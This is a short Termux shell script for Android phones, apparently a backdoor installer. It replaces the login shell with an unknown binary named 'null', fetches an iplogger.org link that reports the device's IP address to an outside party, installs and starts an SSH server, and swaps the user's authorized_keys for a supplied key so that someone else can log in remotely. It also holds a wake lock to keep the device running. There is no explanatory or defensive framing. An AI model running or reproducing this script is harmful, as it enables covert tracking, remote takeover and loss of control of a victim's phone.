chmod +777 null && mv null "$PREFIX/bin/" && chsh -s null
apt install wget -y
wget "https://iplogger.org/11KBF"
apt install openssh -y
sshd
mv Chave $HOME/.ssh && rm authorized_keys && mv Chave authorized_keys
termux-wake-lock
cd $HOME
